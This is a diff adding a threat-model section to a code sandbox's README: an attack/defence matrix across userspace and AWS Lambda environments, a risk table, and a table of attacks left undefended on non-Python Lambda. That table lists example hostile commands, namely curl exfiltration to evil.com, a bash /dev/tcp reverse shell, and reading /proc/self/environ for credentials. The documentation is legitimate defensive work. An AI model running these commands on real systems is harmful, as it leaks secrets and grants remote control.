@@ -321,6 +321,47 @@ For Python code: lang/python/sandbox.py
 For other languages: Consider EC2/ECS with full Sandlock
 ```
 
+### Attack Defense Matrix by Environment
+
+| Attack | Userspace | Lambda+Python | Lambda+Other |
+|--------|:---------:|:-------------:|:------------:|
+| **Network** ||||
+| TCP/UDP exfiltration | ✅ seccomp | ⚠️ import hook | ❌ VPC only |
+| Reverse shell | ✅ seccomp | ⚠️ import hook | ❌ VPC only |
+| **Process** ||||
+| Fork bomb | ✅ seccomp | ✅ import hook | ❌ **Undefended** |
+| subprocess/exec | ✅ seccomp | ✅ import hook | ❌ **Undefended** |
+| **Filesystem** ||||
+| Read /etc/passwd | ✅ Landlock | ✅ restricted open | ❌ **Undefended** |
+| Write anywhere | ✅ Landlock | ✅ restricted open | ❌ **Undefended** |
+| **Low-level** ||||
+| ptrace | ✅ seccomp | ✅ no ctypes | ❌ **Undefended** |
+| Direct syscall | ✅ seccomp | ✅ no ctypes | ❌ **Undefended** |
+| io_uring | ✅ seccomp | ✅ blocked | ❌ **Undefended** |
+| **Resources** ||||
+| CPU exhaustion | ✅ rlimit | ✅ rlimit | ✅ rlimit |
+| Memory exhaustion | ✅ rlimit | ✅ rlimit | ✅ rlimit |
+| Timeout | ✅ SIGALRM | ✅ SIGALRM | ✅ SIGALRM |
+
+### ⚠️ Lambda Non-Python: Undefended Attacks
+
+| Attack | Example | Impact | Mitigation |
+|--------|---------|--------|------------|
+| Data exfiltration | `curl evil.com?d=secret` | Data leak | VPC isolation |
+| Reverse shell | `bash -i >& /dev/tcp/...` | Full control | VPC isolation |
+| Credential theft | `cat /proc/self/environ` | AWS keys | Minimal IAM |
+| Crypto mining | Download & run miner | Resource abuse | VPC + timeout |
+| Lateral movement | Scan internal VPC | Attack other services | Security groups |
+
+### Risk Assessment
+
+| Environment | Security | Recommendation |
+|-------------|:--------:|----------------|
+| Userspace + Sandlock | 🟢 High | Run any untrusted code |
+| Lambda + Python sandbox | 🟡 Medium | Acceptable for student code |
+| Lambda + VPC (non-Python) | 🟠 Low | Only semi-trusted code |
+| Lambda without protection | 🔴 Critical | Never run untrusted code |
+
 ## Testing
 
 ```bash
